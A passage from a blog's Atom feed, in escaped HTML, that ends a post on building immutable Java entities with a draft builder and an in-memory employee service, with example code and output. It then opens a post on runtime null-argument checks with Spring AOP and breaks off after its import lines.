        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;Builder&lt;/span&gt; &lt;span class="nf"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;surname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;Builder&lt;/span&gt; &lt;span class="nf"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;salary&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;EmployeeDraft&lt;/span&gt; &lt;span class="nf"&gt;build&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;EmployeeDraft&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Note that in order to isolate certain fields and methods which are expected to
be only accessed by the &lt;code&gt;Employee&lt;/code&gt; ecosystem, the classes are put into a
separate &lt;code&gt;c.v.i.r.employee&lt;/code&gt; package and internals are exposed to just package
members. Per see, non-package classes are not allowed to instantiate either
&lt;code&gt;EmployeeDraft&lt;/code&gt; or &lt;code&gt;EmployeeDraft.Builder&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="kn"&gt;package&lt;/span&gt; &lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;vlkan&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;immutableentity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;repository&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;employee&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Employee&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="n"&gt;EmployeeDraft&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

    &lt;span class="cm"&gt;/** Note that the default constructor is only visible to the package classes. */&lt;/span&gt;
    &lt;span class="n"&gt;Employee&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;super&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="nf"&gt;getId&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;Builder&lt;/span&gt; &lt;span class="nf"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;Builder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;Employee&lt;/code&gt; merely wraps &lt;code&gt;EmployeeDraft&lt;/code&gt; by just adding new &lt;code&gt;id&lt;/code&gt; field. Note
that non-package classes are not again allowed to instantiate &lt;code&gt;Employee&lt;/code&gt;.
Additionally, calling &lt;code&gt;draft()&lt;/code&gt; either from an &lt;code&gt;Employee&lt;/code&gt; or an
&lt;code&gt;EmployeeDraft&lt;/code&gt; always creates a new &lt;code&gt;EmployeeDraft&lt;/code&gt;, which also make sense
since the new drafted changes are not persisted yet.&lt;/p&gt;

&lt;p&gt;To glue the last piece of the puzzle, here comes the &lt;code&gt;EmployeeService&lt;/code&gt;. To
keep things simple, I purposed a &lt;code&gt;Map&amp;lt;Long, Employee&amp;gt;&lt;/code&gt; together with an
&lt;code&gt;AtomicLong&lt;/code&gt; as a repository.&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="kn"&gt;package&lt;/span&gt; &lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;vlkan&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;immutableentity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;repository&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;employee&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.Map&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.Optional&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.concurrent.ConcurrentHashMap&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.concurrent.atomic.AtomicLong&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.stream.Stream&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;static&lt;/span&gt; &lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;google&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;common&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;base&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Preconditions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;checkNotNull&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;EmployeeService&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;AtomicLong&lt;/span&gt; &lt;span class="n"&gt;dataCounter&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;AtomicLong&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;

    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;Map&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Long&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Employee&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;dataStore&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ConcurrentHashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;gt;();&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;EmployeeDraft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Builder&lt;/span&gt; &lt;span class="nf"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;EmployeeDraft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Builder&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;Employee&lt;/span&gt; &lt;span class="nf"&gt;save&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EmployeeDraft&lt;/span&gt; &lt;span class="n"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nf"&gt;save&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dataCounter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getAndIncrement&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;Employee&lt;/span&gt; &lt;span class="nf"&gt;save&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EmployeeDraft&lt;/span&gt; &lt;span class="n"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;checkNotNull&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"draft cannot be null"&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;Employee&lt;/span&gt; &lt;span class="n"&gt;employee&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;Employee&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSurname&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSalary&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;dataStore&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;employee&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;employee&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;Stream&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Employee&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;findAll&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;dataStore&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;values&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;stream&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;Optional&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Employee&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;findById&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;Optional&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;ofNullable&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dataStore&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Below you can find an example code snippet that uses the introduced classes.&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="n"&gt;EmployeeService&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;EmployeeService&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;

&lt;span class="c1"&gt;// Create a draft from scratch using the service interface.&lt;/span&gt;
&lt;span class="n"&gt;EmployeeDraft&lt;/span&gt; &lt;span class="n"&gt;draft&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Volkan"&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Yazici"&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;build&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;

&lt;span class="cm"&gt;/*&lt;/span&gt;
&lt;span class="cm"&gt; *         Drafts&lt;/span&gt;
&lt;span class="cm"&gt; * -------------------------&lt;/span&gt;
&lt;span class="cm"&gt; *  draft:&lt;/span&gt;
&lt;span class="cm"&gt; *    "Volkan Yazici" $1000&lt;/span&gt;
&lt;span class="cm"&gt; */&lt;/span&gt;

&lt;span class="c1"&gt;// Persist the draft into the data store and obtain an actual employee.&lt;/span&gt;
&lt;span class="n"&gt;Employee&lt;/span&gt; &lt;span class="n"&gt;employee&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;save&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;

&lt;span class="cm"&gt;/*&lt;/span&gt;
&lt;span class="cm"&gt; *           Drafts         |    Persisted Employees&lt;/span&gt;
&lt;span class="cm"&gt; * -------------------------+----------------------------&lt;/span&gt;
&lt;span class="cm"&gt; *  draft:                  | employee:&lt;/span&gt;
&lt;span class="cm"&gt; *    "Volkan Yazici" $1000 |   #0 "Volkan Yazici" $1000&lt;/span&gt;
&lt;span class="cm"&gt; */&lt;/span&gt;

&lt;span class="c1"&gt;// Modify the persisted employee and save it again.&lt;/span&gt;
&lt;span class="n"&gt;EmployeeDraft&lt;/span&gt; &lt;span class="n"&gt;updatedDraft&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;employee&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2000&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;build&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;Employee&lt;/span&gt; &lt;span class="n"&gt;updatedEmployee&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;save&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;updatedDraft&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;employee&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getId&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;

&lt;span class="cm"&gt;/*&lt;/span&gt;
&lt;span class="cm"&gt; *           Drafts         |    Persisted Employees&lt;/span&gt;
&lt;span class="cm"&gt; * -------------------------+----------------------------&lt;/span&gt;
&lt;span class="cm"&gt; *  draft:                  | employee:&lt;/span&gt;
&lt;span class="cm"&gt; *    "Volkan Yazici" $1000 |   #0 "Volkan Yazici" $1000&lt;/span&gt;
&lt;span class="cm"&gt; *                          |&lt;/span&gt;
&lt;span class="cm"&gt; *  updatedDraft:           | updatedEmployee&lt;/span&gt;
&lt;span class="cm"&gt; *    "Volkan Yazici" $2000 |   #0 "Volkan Yazici" $2000&lt;/span&gt;
&lt;span class="cm"&gt; */&lt;/span&gt;

&lt;span class="c1"&gt;// Create a new employee with the same amount of salary using the most recent draft.&lt;/span&gt;
&lt;span class="n"&gt;EmployeeDraft&lt;/span&gt; &lt;span class="n"&gt;forkedDraft&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;updatedDraft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Bob"&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Ross"&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;build&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;Employee&lt;/span&gt; &lt;span class="n"&gt;forkedEmployee&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;save&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;forkedDraft&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;

&lt;span class="cm"&gt;/*&lt;/span&gt;
&lt;span class="cm"&gt; *           Drafts         |    Persisted Employees&lt;/span&gt;
&lt;span class="cm"&gt; * -------------------------+----------------------------&lt;/span&gt;
&lt;span class="cm"&gt; *  draft:                  | employee:&lt;/span&gt;
&lt;span class="cm"&gt; *    "Volkan Yazici" $1000 |   #0 "Volkan Yazici" $1000&lt;/span&gt;
&lt;span class="cm"&gt; *                          |&lt;/span&gt;
&lt;span class="cm"&gt; *  updatedDraft:           | updatedEmployee&lt;/span&gt;
&lt;span class="cm"&gt; *    "Volkan Yazici" $2000 |   #0 "Volkan Yazici" $2000&lt;/span&gt;
&lt;span class="cm"&gt; *                          |&lt;/span&gt;
&lt;span class="cm"&gt; *  forkedDraft:            | forkedEmployee:&lt;/span&gt;
&lt;span class="cm"&gt; *    "Bob Ross" $2000      |   #1 "Bob Ross" $2000&lt;/span&gt;
&lt;span class="cm"&gt; */&lt;/span&gt;

&lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Persisted Employees:\n"&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;findAll&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
        &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;map&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;format&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"#%d \"%s %s\" $%d"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getId&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSurname&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSalary&lt;/span&gt;&lt;span class="o"&gt;()))&lt;/span&gt;
        &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;collect&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;joining&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"\n"&lt;/span&gt;&lt;span class="o"&gt;)));&lt;/span&gt;
&lt;span class="cm"&gt;/*&lt;/span&gt;
&lt;span class="cm"&gt; * Persisted Employees:&lt;/span&gt;
&lt;span class="cm"&gt; * #0 "Volkan Yazici" $2000&lt;/span&gt;
&lt;span class="cm"&gt; * #1 "Bob Ross" $2000&lt;/span&gt;
&lt;span class="cm"&gt; */&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id="the-conclusion"&gt;The Conclusion&lt;/h1&gt;

&lt;p&gt;I had always found it puzzling to work with mutable objects when I needed to
work with persistence frameworks; JPA, Hibernate, Spring Data, etc. In the
lifetime of almost every project that I start, after a certain period of time,
I always find myself implementing my own service layer on top of the used
persistence framework using my custom immutable entities. I really do not know
whether the approach described in this post is something that was already
addressed in the literature or not, but I came up with this idea a couple of
months ago and totally benefitted from it in a project. I hope you would find
it useful too.&lt;/p&gt;
</content>
  </entry>
  <entry>
    <id>tag:vy.github.io,2015-01-08://blog/post/2015/01/30/java-null-check/</id>
    <title type="html">Checking Null Arguments at Runtime Using Spring AOP</title>
    <published>2015-01-08T09:43:00Z</published>
    <updated>2015-01-08T09:43:00Z</updated>
    <link rel="alternate" href="https://vy.github.io//blog/post/2015/01/30/java-null-check/"/>
    <content type="html">
&lt;p&gt;For almost every function I wrote in Java, I add null checks to the method
header as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.annotation.Nonnull&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;static&lt;/span&gt; &lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;google&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;common&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;base&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Preconditions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;checkNotNull&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

